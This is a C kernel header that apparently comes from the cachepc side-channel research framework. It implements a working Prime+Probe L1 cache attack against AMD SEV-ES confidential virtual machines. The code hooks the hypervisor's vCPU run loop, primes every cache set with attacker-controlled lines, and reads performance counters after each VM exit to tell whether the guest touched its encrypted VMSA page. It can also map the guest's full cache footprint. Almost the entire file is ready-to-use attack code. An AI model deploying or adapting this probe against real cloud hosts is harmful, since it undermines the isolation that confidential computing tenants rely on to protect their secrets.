/* vmsa_cachepc_probe.h
 *
 * Self-contained Prime+Probe helper extracted from sinitax/cachepc.
 * Tells you, directly after __svm_sev_es_vcpu_run(), whether the guest
 * touched the VMSA page (i.e. whether virt_to_phys(svm->sev_es.vmsa)
 * maps to a cache set that was evicted during the VM run).
 *
 * USAGE
 * -----
 *      #include "vmsa_cachepc_probe.h"
 *
 *      // Once at vCPU init time (pinned to the right core):
 *      static struct vmsa_pp_state pp;
 *      vmsa_pp_init(&pp);
 *
 *      // Per-exit loop:
 *      vmsa_pp_prime(&pp);
 *      __svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted,
 *                            sev_es_host_save_area(sd));
 *      bool hit = vmsa_pp_probe_and_check(
 *                     &pp,
 *                     virt_to_phys(to_svm(vcpu)->sev_es.vmsa));
 *
 *      // At teardown:
 *      vmsa_pp_free(&pp);
 *
 * REQUIREMENTS
 * ------------
 *  - AMD Zen (Family 19h). L1: 8-way, 64 sets, 64-byte lines.
 *  - Must run on the same physical core as the guest vCPU thread.
 *  - Disable hardware prefetchers for clean results (see cpc_system_setup
 *    in cachepc/kvm.c for the MSR writes).
 */

#pragma once

#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/mm.h>
#include <asm/msr.h>
#include <asm/processor.h>

/* ── L1 cache topology ────────────────────────────────────────────────── */
#define VMSA_PP_L1_ASSOC    8
#define VMSA_PP_L1_SETS     64
#define VMSA_PP_L1_LINESIZE 64
#define VMSA_PP_L1_SIZE     (VMSA_PP_L1_ASSOC * VMSA_PP_L1_SETS * VMSA_PP_L1_LINESIZE)
#define VMSA_PP_L1_LINES    (VMSA_PP_L1_ASSOC * VMSA_PP_L1_SETS)

/* ── AMD PMC: L1-DC misses, host kernel only ──────────────────────────── */
#define VMSA_PP_PMC_IDX        0
#define VMSA_PP_PERFEVTSEL_MSR (0xc0010200ULL + VMSA_PP_PMC_IDX * 2)
#define VMSA_PP_PERFCTR_MSR    (0xc0010201ULL + VMSA_PP_PMC_IDX * 2)

/*
 * event=0x60 umask=0x80  EN=1  OS=1  USR=0  HostGuest=10b (host only)
 * bits: [7:0]=event [15:8]=umask [16]=USR [17]=OS [22]=EN [41:40]=HG
 */
#define VMSA_PP_PERFEVTSEL_VAL \
    ((0x60ULL)        | \
     (0x80ULL << 8)   | \
     (1ULL    << 17)  | \
     (1ULL    << 22)  | \
     (2ULL    << 40))

/* ── Cache-line node: must be exactly VMSA_PP_L1_LINESIZE bytes ───────── */
struct vmsa_pp_cl {
    /*
     * volatile on the pointer fields: ensures every dereference of
     * ->next / ->prev emits a real memory load instruction.  Without
     * volatile the compiler may keep the pointer in a register across
     * the prime/probe loops and never touch the cache line at all,
     * making the whole measurement meaningless.
     */
    struct vmsa_pp_cl * volatile next;  /* offset  0 */
    struct vmsa_pp_cl * volatile prev;  /* offset  8 */
    u64                          count; /* offset 16 – PMC delta from probe */
    u32                          set;   /* offset 24 */
    u32                          line;  /* offset 28 */
    bool                         first; /* offset 32 */
    u8                           _pad[31];
};
static_assert(sizeof(struct vmsa_pp_cl) == VMSA_PP_L1_LINESIZE,
              "vmsa_pp_cl must be exactly one cache line");

/* ── Top-level state ──────────────────────────────────────────────────── */
struct vmsa_pp_state {
    u8                *buf_raw;
    struct vmsa_pp_cl *ds;
    u8                 counts[VMSA_PP_L1_SETS];
};

/* ═══════════════════════════════════════════════════════════════════════
 * Internal: serialising barrier and PMC read
 *
 * Matches cachepc macro.S `barrier` exactly:
 *   mfence  – drain store buffer / prevent load-store reordering
 *   cpuid   – fully serialise the instruction stream so the PMC read
 *             cannot be speculated past the memory accesses we are
 *             measuring.  CPUID leaf 0x80000005 is used because it is
 *             always present on AMD and has no visible side-effects.
 * ═══════════════════════════════════════════════════════════════════════ */

#define VMSA_PP_BARRIER()                        \
    asm volatile(                                \
        "mfence\n\t"                             \
        "mov $0x80000005, %%eax\n\t"             \
        "cpuid\n\t"                              \
        : : : "eax","ebx","ecx","edx","memory")

/*
 * Read PMC with a bare rdmsr – must always be called inside a
 * VMSA_PP_BARRIER()-bracketed region so the reads are serialised
 * relative to the surrounding cache accesses.
 */
static __always_inline u64 _vmsa_pp_read_pmc(void)
{
    u32 lo, hi;
    asm volatile("rdmsr"
                 : "=a"(lo), "=d"(hi)
                 : "c"((u32)VMSA_PP_PERFCTR_MSR)
                 : "memory");
    return ((u64)hi << 32) | lo;
}

static inline void _vmsa_pp_enable_pmc(void)
{
    wrmsrl(VMSA_PP_PERFEVTSEL_MSR, VMSA_PP_PERFEVTSEL_VAL);
    wrmsrl(VMSA_PP_PERFCTR_MSR, 0);
}

/* ═══════════════════════════════════════════════════════════════════════
 * Internal: eviction buffer allocation
 * ═══════════════════════════════════════════════════════════════════════ */

static int _vmsa_pp_build_ds(struct vmsa_pp_state *s)
{
    struct vmsa_pp_cl **ptr_arr;
    struct vmsa_pp_cl *arr;
    size_t i, idx;

    /*
     * __get_free_pages gives a physically contiguous, page-aligned
     * region.  Page-alignment guarantees virt[11:6] == phys[11:6]
     * for normal WB-mapped kernel pages, so the L1 set we hit during
     * prime/probe equals the physical set of the target address.
     */
    arr = (struct vmsa_pp_cl *)__get_free_pages(
              GFP_KERNEL | __GFP_ZERO, get_order(VMSA_PP_L1_SIZE));
    if (!arr)
        return -ENOMEM;

    ptr_arr = kcalloc(VMSA_PP_L1_LINES, sizeof(*ptr_arr), GFP_KERNEL);
    if (!ptr_arr) {
        free_pages((unsigned long)arr, get_order(VMSA_PP_L1_SIZE));
        return -ENOMEM;
    }

    /*
     * Lay out set-first so consecutive ring entries belong to
     * consecutive physical cache sets:
     *   ring[0]       = set 0  way 0
     *   ring[1]       = set 1  way 0
     *   ...
     *   ring[63]      = set 63 way 0
     *   ring[64]      = set 0  way 1
     *   ...
     *   ring[511]     = set 63 way 7
     */
    for (i = 0; i < VMSA_PP_L1_LINES; i++) {
        idx = (i % VMSA_PP_L1_SETS) * VMSA_PP_L1_ASSOC + i / VMSA_PP_L1_SETS;
        ptr_arr[idx]        = arr + i;
        ptr_arr[idx]->set   = i % VMSA_PP_L1_SETS;
        ptr_arr[idx]->line  = i / VMSA_PP_L1_SETS;
        ptr_arr[idx]->first = (ptr_arr[idx]->line == 0);
        ptr_arr[idx]->count = 0;
    }

    for (i = 0; i < VMSA_PP_L1_LINES; i++) {
        ptr_arr[i]->next = ptr_arr[(i + 1) % VMSA_PP_L1_LINES];
        ptr_arr[i]->prev = ptr_arr[(i + VMSA_PP_L1_LINES - 1) % VMSA_PP_L1_LINES];
    }

    s->buf_raw = (u8 *)arr;
    s->ds      = ptr_arr[0];
    kfree(ptr_arr);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * Internal: prime
 *
 * Translated from cachepc macro.S prime_pass / prime.
 *
 * One pass walks the entire ring forward via ->next, touching every
 * cache line.  Because ->next is volatile, each step emits a real load
 * from that cache line's address, bringing it into L1.  Four passes
 * are needed to reliably own all 8 ways on AMD Zen (the hardware
 * replacement policy requires multiple exposures).
 *
 * noinline keeps the four call sites in _vmsa_pp_prime as actual calls
 * so the compiler does not unroll/merge them into one giant sequence
 * that might overflow the instruction cache or get vectorised.
 * ═══════════════════════════════════════════════════════════════════════ */

static noinline void _vmsa_pp_prime_pass(struct vmsa_pp_cl *head)
{
    struct vmsa_pp_cl *cl = head;
    int i;

    VMSA_PP_BARRIER();

    for (i = 0; i < VMSA_PP_L1_LINES; i++) {
        /*
         * volatile dereference via READ_ONCE: the compiler MUST emit a
         * load from the address stored in cl->next.  This is the access
         * that fills the cache line at *cl into L1.
         */
        cl = (struct vmsa_pp_cl *)READ_ONCE(cl->next);
    }

    /*
     * Use cl (which equals head after a full round-trip) in a
     * WRITE_ONCE so the loop is not considered dead and eliminated.
     */
    WRITE_ONCE(cl->count, READ_ONCE(cl->count));

    VMSA_PP_BARRIER();
}

static noinline void _vmsa_pp_prime(struct vmsa_pp_cl *head)
{
    asm volatile("mfence\n\twbinvd\n\t" : : : "memory");
    _vmsa_pp_prime_pass(head);
    _vmsa_pp_prime_pass(head);
    _vmsa_pp_prime_pass(head);
    _vmsa_pp_prime_pass(head);
}

/* ═══════════════════════════════════════════════════════════════════════
 * Internal: probe
 *
 * Translated from cachepc macro.S probe loop.
 *
 * For each of the 64 sets:
 *   - BARRIER + rdmsr  → PMC value before
 *   - Walk L1_ASSOC lines backwards via ->prev (volatile, real loads)
 *   - rdmsr + BARRIER  → PMC value after
 *   - delta stored in way_ptr->count
 *
 * Backwards walk (->prev direction) avoids self-eviction: if we walked
 * forward we would evict lines we loaded at the start of the same set
 * before we finish counting them, inflating the delta.
 *
 * The per-set PMC bracket (barrier–rdmsr … rdmsr–barrier) gives us
 * single-set granularity rather than one global delta.
 * ═══════════════════════════════════════════════════════════════════════ */

static noinline void _vmsa_pp_probe(struct vmsa_pp_cl *head)
{
    struct vmsa_pp_cl *cl = head;
    struct vmsa_pp_cl *way_ptr;
    u64 before, after;
    int i;

    do {
        /* ── before ── */
        VMSA_PP_BARRIER();
        before = _vmsa_pp_read_pmc();

        /*
         * Walk all L1_ASSOC ways of this set backwards.
         * READ_ONCE on the volatile ->prev pointer forces a real load
         * of each cache line; if the guest evicted it the PMC fires.
         */
        way_ptr = cl;
        for (i = 0; i < VMSA_PP_L1_ASSOC - 1; i++)
            cl = (struct vmsa_pp_cl *)READ_ONCE(cl->prev);

        /* final step moves cl to the first line of the previous set */
        cl = (struct vmsa_pp_cl *)READ_ONCE(cl->prev);

        /* ── after ── */
        after = _vmsa_pp_read_pmc();
        VMSA_PP_BARRIER();

        /* store delta – cast to avoid wrap-around confusion on first run */
        WRITE_ONCE(way_ptr->count, (after >= before) ? (after - before) : 0);

    } while (cl != head);
}

/* ═══════════════════════════════════════════════════════════════════════
 * Public API
 * ═══════════════════════════════════════════════════════════════════════ */

/**
 * vmsa_pp_init - Allocate eviction buffer and program the PMC.
 * Call once before the measurement loop, on the correct CPU.
 * Returns 0 on success, negative errno on failure.
 */
static inline int vmsa_pp_init(struct vmsa_pp_state *s)
{
    int ret;
    memset(s, 0, sizeof(*s));
    ret = _vmsa_pp_build_ds(s);
    if (ret)
        return ret;
    _vmsa_pp_enable_pmc();
    return 0;
}

/**
 * vmsa_pp_free - Release the eviction buffer.
 */
static inline void vmsa_pp_free(struct vmsa_pp_state *s)
{
    if (s->buf_raw)
        free_pages((unsigned long)s->buf_raw, get_order(VMSA_PP_L1_SIZE));
    memset(s, 0, sizeof(*s));
}

/**
 * vmsa_pp_prime - Fill all L1 sets with attacker-controlled lines.
 * Call immediately BEFORE __svm_sev_es_vcpu_run().
 */
static inline void vmsa_pp_prime(struct vmsa_pp_state *s)
{
    _vmsa_pp_prime(s->ds);
}

/**
 * vmsa_pp_probe_and_check - Probe after VM exit, return whether the
 * VMSA cache set was evicted.
 *
 * @s:       state from vmsa_pp_init()
 * @vmsa_pa: virt_to_phys(to_svm(vcpu)->sev_es.vmsa)
 *
 * Returns true if the cache set for vmsa_pa shows at least one eviction,
 * meaning the guest accessed the VMSA page during its run.
 *
 * Call immediately AFTER __svm_sev_es_vcpu_run().
 */
static inline bool vmsa_pp_probe_and_check(struct vmsa_pp_state *s,
                                           phys_addr_t vmsa_pa)
{
    struct vmsa_pp_cl *cl;
    /* L1 set = PA[11:6] (VIPT; index bits lie within page offset) */
    u32 target_set = (vmsa_pa >> 6) & (VMSA_PP_L1_SETS - 1);

    _vmsa_pp_probe(s->ds);

    memset(s->counts, 0, sizeof(s->counts));
    cl = s->ds;
    do {
        if (cl->first && cl->set < VMSA_PP_L1_SETS)
            s->counts[cl->set] = (u8)min_t(u64, READ_ONCE(cl->count), 0xFFu);
        WRITE_ONCE(cl->count, 0);
        cl = (struct vmsa_pp_cl *)READ_ONCE(cl->prev);
    } while (cl != s->ds);

    return s->counts[target_set] > 0;
}

/**
 * vmsa_pp_probe_counts - Probe and return raw per-set eviction counts.
 *
 * Returns pointer to internal array of VMSA_PP_L1_SETS bytes (valid
 * until the next probe call).  Useful for observing the full guest
 * cache footprint beyond just the VMSA set.
 */
static inline const u8 *vmsa_pp_probe_counts(struct vmsa_pp_state *s)
{
    struct vmsa_pp_cl *cl;

    _vmsa_pp_probe(s->ds);

    memset(s->counts, 0, sizeof(s->counts));
    cl = s->ds;
    do {
        if (cl->first && cl->set < VMSA_PP_L1_SETS)
            s->counts[cl->set] = (u8)min_t(u64, READ_ONCE(cl->count), 0xFFu);
        WRITE_ONCE(cl->count, 0);
        cl = (struct vmsa_pp_cl *)READ_ONCE(cl->prev);
    } while (cl != s->ds);

    return s->counts;
}